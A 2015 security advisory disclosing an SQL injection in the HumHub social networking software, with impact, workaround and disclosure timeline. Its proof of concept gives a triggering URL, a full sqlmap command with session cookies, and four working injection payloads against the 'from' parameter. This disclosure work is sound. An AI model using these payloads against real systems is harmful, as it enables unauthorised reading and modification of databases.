@@ -1,0 +1,88 @@
+=== LSE Leading Security Experts GmbH - Security Advisory 2015-10-14 ===
+
+HumHub - SQL-Injection
+------------------------------------------------------------------------
+
+Tested Versions
+===============
+HumHub 0.11.2 and 0.20.0-beta.2
+
+Issue Overview
+==============
+Vulnerability Type: 89 - Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
+Technical Risk: high
+Likelihood of Exploitation: high
+Vendor:  HumHub GmbH & Co. KG
+Vendor URL: https://www.humhub.org
+Credits: LSE Leading Security Experts GmbH employee Eric Sesterhenn
+Advisory URL: https://www.lsexperts.de/advisories/lse-2015-10-14.txt
+Advisory Status: Public
+CVE-Number: ----
+CVE URL: ---
+
+
+Impact
+======
+Enables to read and modify the HumHub Mysql Database.
+
+
+Issue Description
+=================
+While conducting an internal software evaluation, LSE Leading
+Security Experts GmbH discovered that the humhub social networking
+software is subject to an sql-injection attack.
+
+
+Temporary Workaround and Fix
+============================
+LSE Leading Security Experts GmbH advises to block
+access to the humhub software until the vendor
+provides a patch.
+
+Proof of Concept
+================
+
+Opening the following URL
+
+http://localhost/humhub/humhub-0.11.2/index.php?r=directory/directory/stream&limit=4&filters=entry_mine,visibility_public,&sort=c&from=5%27%22&mode=normal
+
+shows the SQL-error, which is easily exploitable using sqlmap.
+
+./sqlmap.py -u 'http://localhost:9933/humhub/humhub-0.11.2/index.php?r=directory/directory/stream&limit=4&filters=entry_mine,visibility_public,&sort=c&from=5&mode=normal' --cookie='pm_getting-started-panel=expanded; pm_new-people-panel=expanded; pm_user-statistics-panel=expanded; pm_new-spaces-panel=expanded; pm_spaces-statistics-panel=expanded; sin=f9vou17vnik100rrr5b26v8ip3; CSRF_TOKEN=d94129bfdd49e5d2c628928228519cd6b2c9cf54' --level=2 --risk=2  -p from -a
+
+...
+
+---
+Parameter: from (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: r=directory/directory/stream&limit=4&filters=entry_mine,visibility_public,&sort=c&from=-4670 OR 5804=5804#&mode=normal
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: r=directory/directory/stream&limit=4&filters=entry_mine,visibility_public,&sort=c&from=5 AND (SELECT 7208 FROM(SELECT COUNT(*),CONCAT(0x7170627671,(SELECT (ELT(7208=7208,1))),0x7170786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&mode=normal
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)
+    Payload: r=directory/directory/stream&limit=4&filters=entry_mine,visibility_public,&sort=c&from=5;(SELECT * FROM (SELECT(SLEEP(5)))OXGN)#&mode=normal
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: r=directory/directory/stream&limit=4&filters=entry_mine,visibility_public,&sort=c&from=5 AND (SELECT * FROM (SELECT(SLEEP(5)))nBYr)&mode=normal
+---
+
+
+
+History
+=======
+2015-10-14  Issue discovered
+2015-10-15  Vendor contacted
+2015-10-15  Vendor response and hotfix
+2015-10-20  Vendor releases fixed versions
+2015-11-30  Advisory release
+
+GPG Signature
+=============
+This advisory is signed with the GPG key of the
+LSE Leading Security Experts GmbH advisories team.
+The key can be downloaded here: https://www.lsexperts.de/advisories-key-99E3277C.asc
